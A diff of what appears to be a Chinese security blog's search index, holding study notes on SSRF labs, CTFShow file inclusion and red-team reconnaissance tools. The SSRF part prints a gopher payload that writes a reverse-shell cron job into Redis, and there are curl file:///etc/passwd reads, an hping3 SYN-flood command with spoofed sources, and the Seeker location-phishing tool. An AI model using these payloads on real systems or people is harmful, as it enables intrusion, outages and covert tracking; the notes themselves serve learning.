@@ -2047,7 +2047,8 @@
   <entry>
     <title>JAVA反序列化</title>
     <url>/2022/07/12/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
-    <content><![CDATA[<p>D</p>
+    <content><![CDATA[<!--toc-->
+<span id="more"></span>
 <p>看一看java反序列化漏洞。</p>
 ]]></content>
       <tags>
@@ -2057,12 +2058,15 @@
   <entry>
     <title>SSRF服务器端请求伪造</title>
     <url>/2022/07/11/SSRF%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/</url>
-    <content><![CDATA[<p><a href="https://xz.aliyun.com/t/7333">https://xz.aliyun.com/t/7333</a></p>
+    <content><![CDATA[<!--toc-->
+<p>服务器端请求伪造记录</p>
+<span id="more"></span>
+<p><a href="https://xz.aliyun.com/t/7333">https://xz.aliyun.com/t/7333</a></p>
 <p>[TOC]</p>
-<h2 id="0x00-了解SSRF"><a href="#0x00-了解SSRF" class="headerlink" title="0x00 了解SSRF"></a>0x00 了解SSRF</h2><h3 id="SSRF简介："><a href="#SSRF简介：" class="headerlink" title="SSRF简介："></a>SSRF简介：</h3><p>SSRF(Server-Side Request Forgery)，即服务器端请求伪造，利用漏洞伪造服务器端发起请求，从而突破客户端获取不到数据的限制，本质上是属于信息泄露漏洞。</p>
-<h3 id="SSRF漏洞原理："><a href="#SSRF漏洞原理：" class="headerlink" title="SSRF漏洞原理："></a>SSRF漏洞原理：</h3><p>SSRF形成的原因大都是由于服务器端提供了从其他服务器应用获取数据的功能，但是却没有对目的地址做过滤与限制。比如从指定URL地址获取网页的文本内容，加载指定地址的图片、下载等等。而且在大部分的web服务器架构中，web服务器自身是可以访问互联网和服务器所在的内网的，所以攻击者可以传入任意的地址来让后端服务器对其发起请求，并返回对该目标地址请求的数据。</p>
+<h2 id="0x00-liao-jie-ssrf"><a href="#0x00-了解SSRF" class="headerlink" title="0x00 了解SSRF"></a>0x00 了解SSRF<a href="#0x00-liao-jie-ssrf" class="header-anchor">#</a></h2><h3 id="ssrf-jian-jie"><a href="#SSRF简介：" class="headerlink" title="SSRF简介："></a>SSRF简介：<a href="#ssrf-jian-jie" class="header-anchor">#</a></h3><p>SSRF(Server-Side Request Forgery)，即服务器端请求伪造，利用漏洞伪造服务器端发起请求，从而突破客户端获取不到数据的限制，本质上是属于信息泄露漏洞。</p>
+<h3 id="ssrf-lou-dong-yuan-li"><a href="#SSRF漏洞原理：" class="headerlink" title="SSRF漏洞原理："></a>SSRF漏洞原理：<a href="#ssrf-lou-dong-yuan-li" class="header-anchor">#</a></h3><p>SSRF形成的原因大都是由于服务器端提供了从其他服务器应用获取数据的功能，但是却没有对目的地址做过滤与限制。比如从指定URL地址获取网页的文本内容，加载指定地址的图片、下载等等。而且在大部分的web服务器架构中，web服务器自身是可以访问互联网和服务器所在的内网的，所以攻击者可以传入任意的地址来让后端服务器对其发起请求，并返回对该目标地址请求的数据。</p>
 <p>而且在一般情况下，SSRF攻击的目标是外网无法访问的内部系统（即内网），所以SSRF漏洞也可以用一句话来进行总结：利用一个可以发起网络请求的服务器当作跳板来攻击内部其他服务。</p>
-<h3 id="gopher、dict协议以及redis服务、curl命令"><a href="#gopher、dict协议以及redis服务、curl命令" class="headerlink" title="gopher、dict协议以及redis服务、curl命令"></a>gopher、dict协议以及redis服务、curl命令</h3><p>gopher协议可以做很多事情，特别是在SSRF中可以发挥很多重要的作用。利用此协议可以攻击内网的FTP、Telnet、Redis、Memcache，也可以进行GET、POST请求。</p>
+<h3 id="gopher-dict-xie-yi-yi-ji-redis-fu-wu-curl-ming-ling"><a href="#gopher、dict协议以及redis服务、curl命令" class="headerlink" title="gopher、dict协议以及redis服务、curl命令"></a>gopher、dict协议以及redis服务、curl命令<a href="#gopher-dict-xie-yi-yi-ji-redis-fu-wu-curl-ming-ling" class="header-anchor">#</a></h3><p>gopher协议可以做很多事情，特别是在SSRF中可以发挥很多重要的作用。利用此协议可以攻击内网的FTP、Telnet、Redis、Memcache，也可以进行GET、POST请求。</p>
 <p>dict协议：一个字典服务器协议——A Dictionary Server Protocol，允许客户端在使用过程中访问更多字典并且该协议约定服务器端侦听端口号：2628。 协议详解：</p>
 <p><a href="https://www.cnblogs.com/kkun/archive/2009/03/28/1424052.html">https://www.cnblogs.com/kkun/archive/2009/03/28/1424052.html</a>           </p>
 <p><a href="https://www.cnblogs.com/Node-Sans-Blog/p/15118018.html">https://www.cnblogs.com/Node-Sans-Blog/p/15118018.html</a></p>
@@ -2073,18 +2077,18 @@
 <p>curl命令的详细说明：<a href="http://www.ruanyifeng.com/blog/2019/09/curl-reference.html">http://www.ruanyifeng.com/blog/2019/09/curl-reference.html</a></p>
 <p>此命令的<code>-v</code>参数输出通信的整个过程，用于调试。</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">使用file协议 curl -v file:///etc/passwd</span><br><span class="line">使用ftp协议 curl -v &quot;ftp://127.0.0.1:端口/info&quot;</span><br><span class="line">使用dict协议 curl -v &quot;dict://127.0.0.1:端口/info&quot;</span><br><span class="line">使用gopher协议 curl -v &quot;gopher://127.0.0.1:端口/_info&quot;</span><br></pre></td></tr></table></figure>
-<h3 id="常见内网IP段"><a href="#常见内网IP段" class="headerlink" title="常见内网IP段"></a>常见内网IP段</h3><p>局域网地址范围分三类，以下IP段为内网IP段：</p>
+<h3 id="chang-jian-nei-wang-ip-duan"><a href="#常见内网IP段" class="headerlink" title="常见内网IP段"></a>常见内网IP段<a href="#chang-jian-nei-wang-ip-duan" class="header-anchor">#</a></h3><p>局域网地址范围分三类，以下IP段为内网IP段：</p>
 <p><code>C类：192.168.0.0 - 192.168.255.255</code></p>
 <p><code>B类：172.16.0.0 - 172.31.255.255</code></p>
 <p><code>A类：10.0.0.0 - 10.255.255.255</code></p>
-<h3 id="SSRF漏洞的挖掘与利用："><a href="#SSRF漏洞的挖掘与利用：" class="headerlink" title="SSRF漏洞的挖掘与利用："></a>SSRF漏洞的挖掘与利用：</h3><p>存在SSTF漏洞的站点主要利用四个协议，分别是<code>http、file、gopher、dict</code>协议。</p>
+<h3 id="ssrf-lou-dong-de-wa-jue-yu-li-yong"><a href="#SSRF漏洞的挖掘与利用：" class="headerlink" title="SSRF漏洞的挖掘与利用："></a>SSRF漏洞的挖掘与利用：<a href="#ssrf-lou-dong-de-wa-jue-yu-li-yong" class="header-anchor">#</a></h3><p>存在SSTF漏洞的站点主要利用四个协议，分别是<code>http、file、gopher、dict</code>协议。</p>
 <p><code>file</code>协议进行本地文件的读取</p>
 <p><code>http</code>协议进行内网的ip扫描、端口探测</p>
 <p>探测到<code>6379</code>端口开放，可以利用<code>http、gopher、dict</code>这几个协议来攻击开放了6379端口的redis服务。</p>
 <p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200304115508-f0e8e08a-5dcb-1.png" alt="img"></p>
 <p>下面通过实践练习如何利用SSRF漏洞进行攻击。</p>
 <p>靶场下载地址和使用教程：<a href="https://se8s0n.github.io/2019/05/19/SSRF-LABS%E6%8C%87%E5%8D%97/">https://se8s0n.github.io/2019/05/19/SSRF-LABS%E6%8C%87%E5%8D%97/</a></p>
-<h3 id="ssrf-lab"><a href="#ssrf-lab" class="headerlink" title="ssrf-lab"></a>ssrf-lab</h3><p>答案地址：</p>
+<h3 id="ssrf-lab"><a href="#ssrf-lab" class="headerlink" title="ssrf-lab"></a>ssrf-lab<a href="#ssrf-lab" class="header-anchor">#</a></h3><p>答案地址：</p>
 <p><a href="https://medium.com/poka-techblog/server-side-request-forgery-ssrf-attacks-part-1-the-basics-a42ba5cc244a">https://medium.com/poka-techblog/server-side-request-forgery-ssrf-attacks-part-1-the-basics-a42ba5cc244a</a></p>
 <p>重要的东西<a href="https://se8s0n.github.io/2019/05/19/SSRF-LABS%E6%8C%87%E5%8D%97/">https://se8s0n.github.io/2019/05/19/SSRF-LABS%E6%8C%87%E5%8D%97/</a></p>
 <p>OUTGOING WEBHOOK 输入的<code>https://yourhandler.io/events</code>是有 REST API 监听的需要测试项目</p>
@@ -2113,8 +2117,8 @@
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gopher://127.0.0.1:6379/_*1 $8 flushall *3 $3 set $1 1 $64 */1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/45952 0&gt;&amp;1 *4 $6 config $3 set $3 dir $16 /var/www/html/ *4 $6 config $3 set $10 dbfilename $4 root *1 $4 save quit</span><br></pre></td></tr></table></figure>
 <p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200304115823-64fbf7b4-5dcc-1.png" alt="img"></p>
 <p>利用<code>Gopher</code> 协议还可以攻击 <code>FastCGI</code>，攻击内网 <code>Vulnerability Web</code>。具体可以参考<a href="https://blog.chaitin.cn/gopher-attack-surfaces/">利用 Gopher 协议拓展攻击面</a></p>
-<h2 id="SSRF常见绕过"><a href="#SSRF常见绕过" class="headerlink" title="SSRF常见绕过"></a>SSRF常见绕过</h2><p><a href="https://xz.aliyun.com/t/11215#toc-7">https://xz.aliyun.com/t/11215#toc-7</a></p>
-<h2 id="一些SSTF靶场练习题"><a href="#一些SSTF靶场练习题" class="headerlink" title="一些SSTF靶场练习题"></a>一些SSTF靶场练习题</h2><h3 id="ctfshow的ssrf练习"><a href="#ctfshow的ssrf练习" class="headerlink" title="ctfshow的ssrf练习"></a>ctfshow的ssrf练习</h3><p>答案：</p>
+<h2 id="ssrf-chang-jian-rao-guo"><a href="#SSRF常见绕过" class="headerlink" title="SSRF常见绕过"></a>SSRF常见绕过<a href="#ssrf-chang-jian-rao-guo" class="header-anchor">#</a></h2><p><a href="https://xz.aliyun.com/t/11215#toc-7">https://xz.aliyun.com/t/11215#toc-7</a></p>
+<h2 id="yi-xie-sstf-ba-chang-lian-xi-ti"><a href="#一些SSTF靶场练习题" class="headerlink" title="一些SSTF靶场练习题"></a>一些SSTF靶场练习题<a href="#yi-xie-sstf-ba-chang-lian-xi-ti" class="header-anchor">#</a></h2><h3 id="ctfshow-de-ssrf-lian-xi"><a href="#ctfshow的ssrf练习" class="headerlink" title="ctfshow的ssrf练习"></a>ctfshow的ssrf练习<a href="#ctfshow-de-ssrf-lian-xi" class="header-anchor">#</a></h3><p>答案：</p>
 <p><a href="https://blog.csdn.net/qq_50589021/article/details/120183781">https://blog.csdn.net/qq_50589021/article/details/120183781</a></p>
 <p><a href="https://blog.csdn.net/cosmoslin/article/details/120456960">https://blog.csdn.net/cosmoslin/article/details/120456960</a></p>
 ]]></content>
@@ -2305,12 +2309,6 @@
       </tags>
   </entry>
   <entry>
-    <title>算法导论第二章</title>
-    <url>/2022/07/16/%E7%AE%97%E6%B3%95%E5%AF%BC%E8%AE%BA%E7%AC%AC%E4%BA%8C%E7%AB%A0/</url>
-    <content><![CDATA[<p>T</p>
-]]></content>
-  </entry>
-  <entry>
     <title>ImaginaryCTF-2022</title>
     <url>/2022/07/20/ImaginaryCTF-2022/</url>
     <content><![CDATA[<p>很有趣的一个比赛，继续努力！</p>
@@ -2379,9 +2377,10 @@
   <entry>
     <title>CTFSHOW-文件包含</title>
     <url>/2022/07/22/CTFSHOW-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
-    <content><![CDATA[<p>d</p>
+    <content><![CDATA[<!--toc-->
 <p>CTFSHOW的文件包含的练习笔记。</p>
-<h2 id="第82关"><a href="#第82关" class="headerlink" title="第82关"></a>第82关</h2><p>这一关把点号禁用了，不可以用日志文件包含了。看答案是session文件包含。</p>
+<span id="more"></span>
+<h2 id="di-82-guan"><a href="#第82关" class="headerlink" title="第82关"></a>第82关<a href="#di-82-guan" class="header-anchor">#</a></h2><p>这一关把点号禁用了，不可以用日志文件包含了。看答案是session文件包含。</p>
 <p>答案：<a href="https://www.freebuf.com/vuls/202819.html">https://www.freebuf.com/vuls/202819.html</a></p>
 <p>背后的思想就是利用session.upload_progress将恶意语句写入session文件，随后包含session文件。所以我们需要知道session文件的路径。</p>
 <p>但是还有一些细节的问题没有分析，比如</p>
@@ -2516,15 +2515,15 @@
   <entry>
     <title>渗透测试学习历程</title>
     <url>/2022/07/22/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E5%8E%86%E7%A8%8B/</url>
-    <content><![CDATA[<p><code>红队渗透测试学习历程</code></p>
+    <content><![CDATA[<!--toc-->
+<p><code>红队渗透测试学习历程</code></p>
 <p>在利用kali操作系统学习红队渗透之前，最好在kali下配置好代理。方便我们更新软件</p>
 <p><a href="https://zhuanlan.zhihu.com/p/414998586">https://zhuanlan.zhihu.com/p/414998586</a> kali代理福音！！</p>
 <span id="more"></span>
-<h1><span id="信息收集">信息收集</span></h1><!--toc-->
-<p>[TOC]</p>
-<h2><span id="1nmap">1.Nmap</span></h2><p>安装：Ubuntu: apt-get install nmap</p>
+<h1 id="xin-xi-shou-ji"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集<a href="#xin-xi-shou-ji" class="header-anchor">#</a></h1><p>[TOC]</p>
+<h2 id="nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap<a href="#nmap" class="header-anchor">#</a></h2><p>安装：Ubuntu: apt-get install nmap</p>
 <p>手册：<a href="https://nmap.org/man/zh/index.html">https://nmap.org/man/zh/index.html</a></p>
-<h4><span id="扫描方式">扫描方式</span></h4><ul>
+<h4 id="sao-miao-fang-shi"><a href="#扫描方式" class="headerlink" title="扫描方式"></a>扫描方式<a href="#sao-miao-fang-shi" class="header-anchor">#</a></h4><ul>
 <li>[ ] TCP : -sT</li>
 <li>[ ] SYN : -sS</li>
 <li>[ ] ACK : -sA</li>
@@ -2533,20 +2532,20 @@
 <li>[ ] ICMP : -sP</li>
 <li>[ ] Disable Port Scan : -sn</li>
 </ul>
-<h4><span id="常见扫描方案">常见扫描方案</span></h4><ul>
+<h4 id="chang-jian-sao-miao-fang-an"><a href="#常见扫描方案" class="headerlink" title="常见扫描方案"></a>常见扫描方案<a href="#chang-jian-sao-miao-fang-an" class="header-anchor">#</a></h4><ul>
 <li>[ ] 扫描10000端口、操作系统、版本: namp -T4 -A <target></target></li>
 <li>[ ] 版本探测: nmap -sV <target></target></li>
 <li>[ ] nmap -O <target></target></li>
 </ul>
 <p>如上可以看出nmap的参数使用方式大多都是 -s? ，s应该代表扫描的意思，后面的字符表明了扫描的方式。</p>
-<h4><span id="其他技巧">其他技巧</span></h4><ul>
+<h4 id="qi-ta-ji-qiao"><a href="#其他技巧" class="headerlink" title="其他技巧"></a>其他技巧<a href="#qi-ta-ji-qiao" class="header-anchor">#</a></h4><ul>
 <li>[ ] —host-timeout 主机超时时间，通常选值：18000</li>
 <li>[ ] —scan-delay 报文时间间隔，通常选址：1000</li>
 <li>[ ] -S &lt;源地址&gt; 定义扫描源地址，为了不被发现 </li>
 </ul>
-<h4><span id="示例">示例</span></h4><p><code>nmap -V -iR 100000 -P0 -p 80</code> 随机选择100000台主机扫描是否允许Web服务器（80端口）。由起始阶段发送探测报文来确定主机是否工作非常浪费时间，而且只需探测主机的一个端口，因此使用-P0禁止对主机列表</p>
+<h4 id="shi-li"><a href="#示例" class="headerlink" title="示例"></a>示例<a href="#shi-li" class="header-anchor">#</a></h4><p><code>nmap -V -iR 100000 -P0 -p 80</code> 随机选择100000台主机扫描是否允许Web服务器（80端口）。由起始阶段发送探测报文来确定主机是否工作非常浪费时间，而且只需探测主机的一个端口，因此使用-P0禁止对主机列表</p>
 <p><code>host -l company.com | cut -d -f 4 | nmap -v -iL</code> 进行DNS区域传输，以发现company.com中的主机，然后将ip地址提供给Nmap</p>
-<h4><span id="输出">输出</span></h4><ul>
+<h4 id="shu-chu"><a href="#输出" class="headerlink" title="输出"></a>输出<a href="#shu-chu" class="header-anchor">#</a></h4><ul>
 <li><p>[ ] -oN <file></file></p>
 </li>
 <li><p>[ ] -oX <xml file></xml></p>
@@ -2556,7 +2555,7 @@
 </li>
 </ul>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -O -oG - 10.1.1.100</span><br><span class="line">sudo nmap -oG -</span><br><span class="line">sudo nmap -oG test.txt baidu.com </span><br><span class="line">test.txt默认保存在当前的目录下</span><br></pre></td></tr></table></figure>
-<h2><span id="2masscan">2.masscan</span></h2><p>项目地址： <a href="https://github.com/robertdavidgraham/masscan">https://github.com/robertdavidgraham/masscan</a></p>
+<h2 id="masscan"><a href="#masscan" class="headerlink" title="masscan"></a>masscan<a href="#masscan" class="header-anchor">#</a></h2><p>项目地址： <a href="https://github.com/robertdavidgraham/masscan">https://github.com/robertdavidgraham/masscan</a></p>
 <p>安装：</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get install git gcc make libpcap-dev</span><br><span class="line">git clone https://github.com/robertdavidgraham/masscan</span><br><span class="line">cd masscan</span><br><span class="line">make</span><br></pre></td></tr></table></figure>
 <p>该工具兼容Nmap的参数</p>
@@ -2571,7 +2570,7 @@
 <li>[ ] —includefile,-iL 读取一个范围列表进行扫描</li>
 <li>[ ] —wait 指定发送完包之后的等待时间，默认为10秒</li>
 </ul>
-<h2><span id="3nbtscan">3.Nbtscan</span></h2><p>Nbtscan是一个扫描Windows网络NetBIOS信息的小工具，身材娇小，简单快速。但只能用于局域网，可以显示IP，主机名，用户名称和MAC地址等等，通常用于后渗透、内网渗透的信息收集。</p>
+<h2 id="nbtscan"><a href="#Nbtscan" class="headerlink" title="Nbtscan"></a>Nbtscan<a href="#nbtscan" class="header-anchor">#</a></h2><p>Nbtscan是一个扫描Windows网络NetBIOS信息的小工具，身材娇小，简单快速。但只能用于局域网，可以显示IP，主机名，用户名称和MAC地址等等，通常用于后渗透、内网渗透的信息收集。</p>
 <p>下载地址：</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/search?q=nbtscan</span><br></pre></td></tr></table></figure>
 <p>Nbtscan在Kali中自带了。</p>
@@ -2587,7 +2586,7 @@
 <p>四、扫描文件里的目标范围：</p>
 <p>扫描参数： nbtscan -f 文件名</p>
 <p><img src="https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKwvIuOmsoicpffk7N0cVibfD2ibjEuJjicYBl9TJ7Zwh1ichS8L6oOAHXRRoLTHibVUMrY3IdMVicQjjRBA/640" alt="img"></p>
-<h2><span id="4hping3-信息搜集">4.Hping3-信息搜集</span></h2><p>hping3是一款免费的数据包生成器和分析器。可用于安全审计、防火墙规则测试、网络测试、端口扫描、性能测试、压力测试，几乎可以发送任意类型的TCP/IP数据包。功能强大但是每次只能向一个IP地址发送数据包，还能够在两个相互包含的通道之间传送文件。</p>
+<h2 id="hping3-xin-xi-sou-ji"><a href="#Hping3-信息搜集" class="headerlink" title="Hping3-信息搜集"></a>Hping3-信息搜集<a href="#hping3-xin-xi-sou-ji" class="header-anchor">#</a></h2><p>hping3是一款免费的数据包生成器和分析器。可用于安全审计、防火墙规则测试、网络测试、端口扫描、性能测试、压力测试，几乎可以发送任意类型的TCP/IP数据包。功能强大但是每次只能向一个IP地址发送数据包，还能够在两个相互包含的通道之间传送文件。</p>
 <p>下载地址：</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.hping.org/download.html</span><br></pre></td></tr></table></figure>
 <p>Hping3常见的使用方法：</p>
@@ -2606,7 +2605,7 @@
 <p>扫描参数： hping3 -S —flood -rand —source -p 80 目标</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-S 表示发送的是SYN包。这里涉及到TCP的三次握手，客户端与服务器要建立连接，首先要先由客户端向发服务器发送一个SYN包请求连接，服务器收到客户端发来的SYN包后会回复一个SYN+ACK包表示可以进行连接，之后客户端再发送一个SYN+ACK包，当这个包发送完成之后，客户端和服务器的连接就算成功了。因此，这个参数导致的结果时向服务器发送SYN包却不对返回的SYN+ACK包进行回应，使服务器保持在一种&quot;半连接&quot;在状态</span><br><span class="line">--flood 表示以洪水的方式发送，就是拼了命地发</span><br><span class="line">-rand--source 是指定随机来源，意思是假装有很多台主机要和服务器连接，实际上这些主机IP都是伪造的-p 80 指定端口号为80</span><br></pre></td></tr></table></figure>
 <p><img src="https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LJaYja8J7lQyQjNvnZkYa5ia6Jp3wtjK1wA21r7us6ZBwUOicxT4aoemeMia4oqLJD8FJzHatbrETSIw/640?wx_fmt=png" alt="img"></p>
-<h2><span id="5pydictor字典生成-信息收集">5.Pydictor字典生成-信息收集</span></h2><p>关联信息生成：</p>
+<h2 id="pydictor-zi-dian-sheng-cheng-xin-xi-shou-ji"><a href="#Pydictor字典生成-信息收集" class="headerlink" title="Pydictor字典生成-信息收集"></a>Pydictor字典生成-信息收集<a href="#pydictor-zi-dian-sheng-cheng-xin-xi-shou-ji" class="header-anchor">#</a></h2><p>关联信息生成：</p>
 <p>在渗透前期工作开展之前，需要对目标的各种信息进行分析、研究、组合。</p>
 <p>例如：某度</p>
 <p>根据地域习惯、宗教、互联网开放信息等信息进行简要分析，假设获取到的信息如下：</p>
@@ -2634,7 +2633,7 @@
 <p><a href="https://www.cnblogs.com/R-S-PY/p/12929170.html">https://www.cnblogs.com/R-S-PY/p/12929170.html</a></p>
 <p><a href="https://github.com/LandGrey/pydictor/blob/master/README_CN.md">https://github.com/LandGrey/pydictor/blob/master/README_CN.md</a></p>
 <p><a href="https://github.com/LandGrey/pydictor/blob/master/docs/doc/usage.md">https://github.com/LandGrey/pydictor/blob/master/docs/doc/usage.md</a></p>
-<h2><span id="6如何实现精准gps定位ip及坐标精确误差50m范围左右-信息搜集">6.如何实现精准GPS定位IP及坐标，精确误差50m范围左右-信息搜集</span></h2><p>无论是在hvv期间的红队还是蓝队，又或者是在实际情况中，信息搜集是最为重要的。但你获取到足够多的情报那么你的任务就已经完成了一半。而你只需要想：我拿到信息之后如何去利用它？</p>
+<h2 id="ru-he-shi-xian-jing-zhun-gps-ding-wei-ip-ji-zuo-biao-jing-que-wu-chai-50m-fan-wei-zuo-you-xin-xi-sou-ji"><a href="#如何实现精准GPS定位IP及坐标，精确误差50m范围左右-信息搜集" class="headerlink" title="如何实现精准GPS定位IP及坐标，精确误差50m范围左右-信息搜集"></a>如何实现精准GPS定位IP及坐标，精确误差50m范围左右-信息搜集<a href="#ru-he-shi-xian-jing-zhun-gps-ding-wei-ip-ji-zuo-biao-jing-que-wu-chai-50m-fan-wei-zuo-you-xin-xi-sou-ji" class="header-anchor">#</a></h2><p>无论是在hvv期间的红队还是蓝队，又或者是在实际情况中，信息搜集是最为重要的。但你获取到足够多的情报那么你的任务就已经完成了一半。而你只需要想：我拿到信息之后如何去利用它？</p>
 <p>精准定位- <code>Seeker</code></p>
 <p>Seeker背后的概念很简单，就像我们托管网络钓鱼页面以获得凭据一样，为什么不托管一个伪造页面来请求你的位置，就像许多流行的基于位置得网站一样。Seeker在内置PHP服务器上托管了一个虚假网站，并使用Serveo生成了一个链接，该链接将转发给目录，网站要求提供位置许可，如果目标允许，我们可以获得：</p>
 <p>经度、纬度、精准性、高度-并非总是可用、方向-仅在用户移动时可用、速度-仅在用户移动时可用</p>
@@ -2645,7 +2644,7 @@
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/thewhiteh4t/seeker.git</span><br><span class="line">cd seeker/</span><br><span class="line">chmod 777 install.sh</span><br><span class="line">./install.sh</span><br></pre></td></tr></table></figure>
 <p><img src="https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLtiaBc8GsMDzm1y3ibCZ6LbXBm67N4jdBX2zDSpya09DMIqmc45mMhR4rLYwGTlgFB3kp2zOuCNf9A/640?wx_fmt=png" alt="img"></p>
 <p>后面要用到公网域名了，以后再补这个工具把。</p>
-<h2><span id="7开放漏洞exp-poc情报搜集">7.开放漏洞（exp、poc）情报搜集</span></h2><h3><span id="常见漏洞情报网站">常见漏洞情报网站</span></h3><p><strong>Exploit-DB</strong>是一个面向全世界黑客的漏洞提交平台，该平台会公布最新漏洞的相关情况，这些可用帮助企业改善公司的安全状况，同时也以帮助安全研究者和渗透测试工程师更好的进行安全测试工作。<strong>Exploit-DB</strong>提供一整套庞大的归档体系，其中涵盖了各类公开的攻击事件、漏洞报告、安全文章以及技术教程等资源。</p>
+<h2 id="kai-fang-lou-dong-exp-poc-qing-bao-sou-ji"><a href="#开放漏洞（exp、poc）情报搜集" class="headerlink" title="开放漏洞（exp、poc）情报搜集"></a>开放漏洞（exp、poc）情报搜集<a href="#kai-fang-lou-dong-exp-poc-qing-bao-sou-ji" class="header-anchor">#</a></h2><h3 id="chang-jian-lou-dong-qing-bao-wang-zhan"><a href="#常见漏洞情报网站" class="headerlink" title="常见漏洞情报网站"></a>常见漏洞情报网站<a href="#chang-jian-lou-dong-qing-bao-wang-zhan" class="header-anchor">#</a></h3><p><strong>Exploit-DB</strong>是一个面向全世界黑客的漏洞提交平台，该平台会公布最新漏洞的相关情况，这些可用帮助企业改善公司的安全状况，同时也以帮助安全研究者和渗透测试工程师更好的进行安全测试工作。<strong>Exploit-DB</strong>提供一整套庞大的归档体系，其中涵盖了各类公开的攻击事件、漏洞报告、安全文章以及技术教程等资源。</p>
 <p>官方网站：</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://www.exploit-db.com/</span><br></pre></td></tr></table></figure>
 <p>命令参数介绍</p>
@@ -2687,7 +2686,7 @@
 <p><a href="https://www.freebuf.com/sectool/139685.html">https://www.freebuf.com/sectool/139685.html</a></p>
 <p><a href="https://blog.csdn.net/qq_20336817/article/details/42320189">https://blog.csdn.net/qq_20336817/article/details/42320189</a></p>
 <p><a href="https://www.jianshu.com/p/ca234f8cd661">https://www.jianshu.com/p/ca234f8cd661</a></p>
-<h2><span id="8-whois-dns-旁站c段查询-信息搜集篇">8.  Whois、Dns、旁站C段查询-信息搜集篇</span></h2><h3><span id="主机发现">主机发现</span></h3><p>在知道目标的域名之后，您想做的第一件事可能就是从whois数据库里获取域名的注册信息。whois数据库记录有该域名的DNS服务器信息和注册人的联系信息。</p>
+<h2 id="whois-dns-pang-zhan-c-duan-cha-xun-xin-xi-sou-ji-pian"><a href="#Whois、Dns、旁站C段查询-信息搜集篇" class="headerlink" title="Whois、Dns、旁站C段查询-信息搜集篇"></a>Whois、Dns、旁站C段查询-信息搜集篇<a href="#whois-dns-pang-zhan-c-duan-cha-xun-xin-xi-sou-ji-pian" class="header-anchor">#</a></h2><h3 id="zhu-ji-fa-xian"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现<a href="#zhu-ji-fa-xian" class="header-anchor">#</a></h3><p>在知道目标的域名之后，您想做的第一件事可能就是从whois数据库里获取域名的注册信息。whois数据库记录有该域名的DNS服务器信息和注册人的联系信息。</p>
 <p>WHOIS是一个标准的互联网协议，可用于收集网络注册、注册域名、ip地址和自治系统的信息。</p>
 <p>Kali Linux带有whois客户端程序。如果需要查询某一域名的whois信息，可在终端中使用下述whois指令：</p>
 <p>查询命令：</p>
@@ -2697,14 +2696,14 @@
 <p><img src="https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKynSSqTP7HazbNic3tlLk93L8Hqsl26rNOo3bYt8ib2Vaa8XuYJlG6yiaYuOt7tIaFq5PXKAUibMLbnA/640?wx_fmt=png" alt="img"></p>
 <p>还可以通过whois反查域名或者邮箱还注册了那些域名：</p>
 <p><img src="https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKynSSqTP7HazbNic3tlLk93kEAo9x8ibp1to3wSOF9TFhXZWOjgsvnfwDicNEMBCia2dbhqdXSqiaG3Tg/640?wx_fmt=png" alt="img"></p>
-<h3><span id="dns历史解析">DNS历史解析</span></h3><p>查询网站曾经解析到过那些服务器，对于了解一个网站成长过程，信息搜集，对我们红队人员有很大的帮助！先说一下什么是A记录、别名记录、MX记录、TXT记录、NS记录。</p>
-<h4><span id="a记录">A记录：</span></h4><p>是用来指定主机名或域名对应的IP地址记录。用户可以将该域名下的网站服务器指向到自己的web server上。同时也可以设置您域名的二级域名。</p>
-<h4><span id="别名cname记录">别名(CNAME)记录：</span></h4><p>也被成为规范名字。这种记录允许您将多个名字映射到同一台计算机。通常用于同时提供WWW和MAIL服务的计算机。例如，有一台计算机名为 <code>host.mydomain.com</code>（A记录）。它同时提供WWW和MAIL服务，为了便于用户访问服务。可以为该计算机设置两个别名（CNAME）：WWW和MAIL。这两个别名的全称就是<code>www.mydomain.com</code>和<code>mail.mydomain.com</code>。实际上他们都指向<code>host.mydomain.com</code>。同样的方法可以用于当您拥有多个域名需要指向同一服务器IP，此时您就可以将一个域名做A记录指向服务器IP，此时您就可以将一个域名做A记录指向服务器IP，然后将其他得域名做别名到之前做A记录得域名上，那么当您得服务器IP地址变更时您就可以不必麻烦得一个一个域名更改指向了，只需要改做A记录得那个域名其他做别名得那些域名得指向也将自动更改到新得IP地址上了。</p>
+<h3 id="dns-li-shi-jie-xi"><a href="#DNS历史解析" class="headerlink" title="DNS历史解析"></a>DNS历史解析<a href="#dns-li-shi-jie-xi" class="header-anchor">#</a></h3><p>查询网站曾经解析到过那些服务器，对于了解一个网站成长过程，信息搜集，对我们红队人员有很大的帮助！先说一下什么是A记录、别名记录、MX记录、TXT记录、NS记录。</p>
+<h4 id="a-ji-lu"><a href="#A记录：" class="headerlink" title="A记录："></a>A记录：<a href="#a-ji-lu" class="header-anchor">#</a></h4><p>是用来指定主机名或域名对应的IP地址记录。用户可以将该域名下的网站服务器指向到自己的web server上。同时也可以设置您域名的二级域名。</p>
